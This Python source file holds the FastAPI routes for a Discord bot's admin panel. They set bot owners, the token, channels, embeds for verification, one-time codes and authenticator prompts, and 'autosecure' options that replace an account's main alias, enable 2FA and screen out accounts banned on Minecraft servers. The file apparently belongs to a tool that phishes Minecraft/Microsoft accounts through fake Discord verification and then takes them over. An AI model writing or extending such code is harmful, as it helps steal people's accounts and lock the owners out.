from web.models import OwnerAddRequest, BotStatusRequest, AutosecureRequest, VerificationEmbedRequest, PostVerificationRequest, PostVerificationAction, AuthEmbedsRequest, AfterVerifyEmbedRequest, BeforeAuthEmbedRequest, UpdateChannelRequest, UpdateTokenRequest, VerificationButtonRequest
from fastapi import APIRouter, Depends, HTTPException
from web.config import require_auth, get_config
import httpx
import json
import os

router = APIRouter()

@router.get("/api/bot/config")
def get_bot_config(user: str = Depends(require_auth)):
    data = get_config()
    
    config = data["main"]
    wconfig = data["web"]

    discord = config.get("discord", {})
    discord.setdefault("verify_channel", "")
    tokens = config.get("tokens", {})

    data = {
        "owners": config["owners"],
        "autosecure": config["autosecure"],
        "discord": discord,
        "bot_token": tokens.get("bot_token", ""),
        "presence": wconfig["presence"],
        "embeds": wconfig["embeds"]
    }

    if "ephemeral" in wconfig:
        data["ephemeral"] = wconfig["ephemeral"]
    if "post_verification" in wconfig:
        data["post_verification"] = wconfig["post_verification"]
    if "verification_button" in wconfig:
        data["verification_button"] = wconfig["verification_button"]

    return data


@router.get("/api/bot/servers")
def get_bot_servers(user: str = Depends(require_auth)):
    config = get_config()["main"]
    token = config["tokens"]["bot_token"]

    if not token:
        raise HTTPException(400, "Bot token not configured")

    try:
        response = httpx.get(
            "https://discord.com/api/v10/users/@me/guilds",
            headers={"Authorization": f"Bot {token}"},
            timeout=10,
        )
        if response.status_code != 200:
            raise HTTPException(502, f"Discord API returned {response.status_code}")

        data = response.json()
        return [
            {
                "id": int(info["id"]),
                "name": info["name"],
                "icon": info["icon"] if "icon" in info else None,
                "owner": info["owner"] if "owner" in info else False,
                "approximate_member_count": info["approximate_member_count"] if "approximate_member_count" in info else None
            }
            for info in data
        ]

    except httpx.RequestError as e:
        raise HTTPException(502, f"Failed to reach Discord API: {e}")


@router.post("/api/bot/owners")
def add_owner(body: OwnerAddRequest, user: str = Depends(require_auth)):
    config = get_config()["main"]
    owners = config["owners"]

    if body.id not in owners:
        owners.append(body.id)

    with open("config/config.json", "w") as f:
        json.dump(config, f, indent=2)

    return {"ok": True}


@router.delete("/api/bot/owners/{id}")
def remove_owner(id: int, user: str = Depends(require_auth)):
    config = get_config()["main"]
    config["owners"] = [o for o in config["owners"] if o != id]

    with open("config/config.json", "w") as f:
        json.dump(config, f, indent=2)

    return {"ok": True}


@router.post("/api/bot/status")
def set_bot_status(body: BotStatusRequest, user: str = Depends(require_auth)):
    bc = get_config()["web"]

    bc["presence"] = {
        "status": body.status,
        "activity_text": body.activity_text,
        "activity_type": body.activity_type,
    }

    with open("config/bot.json", "w") as f:
        json.dump(bc, f, indent=2)
    
    return {"ok": True}


@router.post("/api/bot/autosecure")
def set_autosecure(body: AutosecureRequest, user: str = Depends(require_auth)):
    config = get_config()["main"]

    auto = config.setdefault("autosecure", {})
    auto["replace_main_alias"] = body.replace_main_alias
    auto["enable_2fa"] = body.enable_2fa
    auto["minecon_mode"] = body.minecon_mode

    reject = auto.setdefault("reject", {})
    if body.check_hypixel_ban is not None:
        reject["check_hypixel_ban"] = bool(body.check_hypixel_ban)
    if body.check_donutsmp_ban is not None:
        reject["check_donutsmp_ban"] = bool(body.check_donutsmp_ban)

    with open("config/config.json", "w") as f:
        json.dump(config, f, indent=2)

    return {"ok": True}


@router.get("/api/bot/embeds")
def get_embeds(user: str = Depends(require_auth)):
    bc = get_config()["web"]

    return {
        "embeds": bc["embeds"],
        "ephemeral": bc["ephemeral"],
    }


@router.post("/api/bot/embeds/verification")
def save_verification_embed(body: VerificationEmbedRequest, user: str = Depends(require_auth)):
    bc = get_config()["web"]
    bc.setdefault("embeds", {}).setdefault("verification", {})["default"] = {
        "title": body.title,
        "description": body.description,
        "color": body.color,
    }
    bc["ephemeral"] = body.ephemeral
    with open("config/bot.json", "w") as f:
        json.dump(bc, f, indent=2)
    return {"ok": True}


@router.post("/api/bot/button")
def save_verification_button(body: VerificationButtonRequest, user: str = Depends(require_auth)):
    valid_colors = {"primary", "secondary", "success", "danger"}
    if not body.text.strip():
        raise HTTPException(400, detail="Button text cannot be empty.")
    if body.color not in valid_colors:
        raise HTTPException(400, detail=f"Invalid color. Use: {', '.join(valid_colors)}")
    bc = get_config()["web"]
    bc["verification_button"] = {"text": body.text.strip(), "color": body.color}
    with open("config/bot.json", "w") as f:
        json.dump(bc, f, indent=2)
    return {"ok": True}


@router.post("/api/bot/embeds/auth")
def save_auth_embeds(body: AuthEmbedsRequest, user: str = Depends(require_auth)):
    ps = body.authenticator
    if "{entropy}" not in ps.title and "{entropy}" not in ps.description:
        raise HTTPException(
            400,
            detail="The Authenticator Request embed must include {entropy} in its title or description.",
        )
    bc = get_config()["web"]
    bc.setdefault("embeds", {})["auth"] = {
        "otp": body.otp.model_dump(),
        "authenticator": ps.model_dump(),
    }
    with open("config/bot.json", "w") as f:
        json.dump(bc, f, indent=2)
    return {"ok": True}


@router.post("/api/bot/embeds/after-verify")
def save_after_verify_embed(body: AfterVerifyEmbedRequest, user: str = Depends(require_auth)):
    bc = get_config()["web"]
    bc.setdefault("embeds", {})["after_verify"] = {"default": body.embed.model_dump()}
    with open("config/bot.json", "w") as f:
        json.dump(bc, f, indent=2)
    return {"ok": True}


@router.post("/api/bot/embeds/before-auth")
def save_before_auth_embed(body: BeforeAuthEmbedRequest, user: str = Depends(require_auth)):
    bc = get_config()["web"]

    bc.setdefault("embeds", {})["before_auth"] = {
        "default": body.embed.model_dump()
    }
    with open("config/bot.json", "w") as f:
        json.dump(bc, f, indent=2)

    return {"ok": True}


@router.post("/api/bot/post-verification")
def save_post_verification(body: PostVerificationRequest, user: str = Depends(require_auth)):
    bc = get_config()["web"]
    
    bc["post_verification"] = {
        "actions": [a.model_dump() for a in body.actions]
    }
    with open("config/bot.json", "w") as f:
        json.dump(bc, f, indent=2)
    
    return {"ok": True}


@router.post("/api/bot/channels")
def update_channels(body: UpdateChannelRequest, user: str = Depends(require_auth)):
    config = get_config()["main"]
    discord = config.setdefault("discord", {})

    if body.logs_channel:
        discord["logs_channel"] = body.logs_channel

    elif body.accounts_channel:
        discord["accounts_channel"] = body.accounts_channel

    elif body.censored_logs_channel:
        discord["censored_logs_channel"] = body.censored_logs_channel

    elif body.verify_channel:
        discord["verify_channel"] = body.verify_channel

    with open("config/config.json", "w") as f:
        json.dump(config, f, indent=2)

    return {"ok": True}


@router.post("/api/bot/token")
def update_bot_token(body: UpdateTokenRequest, user: str = Depends(require_auth)):
    config = get_config()["main"]
    config.setdefault("tokens", {})["bot_token"] = body.bot_token
    
    with open("config/config.json", "w") as f:
        json.dump(config, f, indent=2)

    return {"ok": True}


@router.post("/api/bot/restart")
def restart_bot(user: str = Depends(require_auth)):
    import subprocess, signal, platform, sys, time
    system = platform.system()

    if system == "Windows":
        subprocess.run(
            ["taskkill", "/f", "/im", "python.exe"],
            capture_output=True, timeout=10,
        )
        python = sys.executable
        subprocess.Popen(
            [python, os.path.join(".", "bot.py")],
            creationflags=subprocess.CREATE_NEW_CONSOLE if hasattr(subprocess, 'CREATE_NEW_CONSOLE') else 0,
        )

    else:

        result = subprocess.run(
            ["pgrep", "-f", "bot\\.py"],
            capture_output=True, text=True, timeout=10,
        )
        for pid in result.stdout.strip().split():
            pid = pid.strip()
            if pid:
                try:
                    os.kill(int(pid), signal.SIGTERM)
                except (OSError, ValueError):
                    pass

        time.sleep(1)
        venv_python = os.path.join(".", ".venv", "bin", "python")
        if not os.path.exists(venv_python):
            venv_python = sys.executable

        subprocess.Popen(
            [venv_python, os.path.join(".", "bot.py")],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

    return {"ok": True, "message": "Bot restart initiated"}
